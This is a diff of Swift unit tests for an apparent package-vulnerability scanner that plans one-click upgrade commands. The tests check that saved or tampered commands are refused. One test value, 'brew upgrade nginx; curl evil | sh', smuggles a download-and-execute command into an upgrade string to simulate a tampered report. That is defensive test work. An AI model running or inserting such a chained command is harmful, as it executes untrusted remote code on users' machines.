@@ -12,12 +12,12 @@ func fixable(_ origin: Origin, _ name: String, _ ecosystem: Ecosystem? = .npm, i
              malicious: Bool = false, subject: Finding.Subject? = nil, component: String? = nil, id: String? = nil) -> Finding {
     let upgrade = malicious ? nil : fixed.map { Fixture.fix($0, above: installed) }
     let inputs = UpgradeCommand.Inputs(origin: origin, name: name, ecosystem: ecosystem, target: upgrade, malicious: malicious)
-    let command = UpgradeCommand.advice(inputs, home: home).command
+    let advice = UpgradeCommand.advice(inputs, home: home)
     return Finding(id: id ?? "pkg|\(name)|\(installed)", group: malicious ? .malicious : .criticalHigh,
                    subject: subject ?? .package(ecosystem: ecosystem ?? .npm, name: name), title: name, component: component,
                    installedVersion: installed, upgrade: upgrade, severity: .high, advisoryIDs: [], flawCount: 1,
                    exploited: false, malicious: malicious, note: nil, bigIssue: nil, origins: [origin],
-                   pageURL: URL(string: "https://verificationalliance.org/")!, upgradeCommand: command, verification: .none, grade: nil,
+                   pageURL: URL(string: "https://verificationalliance.org/")!, advice: advice, verification: .none, grade: nil,
                    commandInputs: inputs)
 }
 
@@ -139,8 +139,9 @@ func ok(_ r: Result<FixPlan, FixPlan.Refusal>, sourceLocation: SourceLocation = 
     /// Fix button runs: the inputs no longer give that command.
     @Test func aSavedLatestCommandIsNotRunAgain() {
         let inputs = Fixture.savedInputs(origin: .npmGlobal(npm: "/opt/homebrew/bin/npm"), name: "lodash", ecosystem: .npm, target: nil, malicious: false)
-        var f = fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "lodash", installed: "4.17.20", fixed: "4.17.21")
-        f.commandInputs = inputs; f.upgradeCommand = "npm install -g lodash@latest"; f.setUpgrade(nil)
+        var f = Fixture.saved(fixable(.npmGlobal(npm: "/opt/homebrew/bin/npm"), "lodash", installed: "4.17.20", fixed: "4.17.21"),
+                              ["upgradeCommand": "npm install -g lodash@latest", "fixedVersion": nil])
+        f.commandInputs = inputs
         #expect(plan(f) == .failure(.notReproducible))
     }
 }
@@ -220,7 +221,7 @@ func ok(_ r: Result<FixPlan, FixPlan.Refusal>, sourceLocation: SourceLocation = 
         f.commandInputs = nil                                                  // a report saved before the button existed
         #expect(plan(f) == .failure(.notReproducible))
         f = fixable(.homebrewFormula(name: "nginx"), "nginx", nil)
-        f.upgradeCommand = "brew upgrade nginx; curl evil | sh"                 // a report changed on disk
+        f = Fixture.saved(f, ["upgradeCommand": "brew upgrade nginx; curl evil | sh"])     // a report changed on disk
         #expect(plan(f) == .failure(.notReproducible))
         f = fixable(.homebrewFormula(name: "nginx"), "nginx", nil)
         f.commandInputs?.origin = .homebrewFormula(name: "curl")                // inputs that make another command
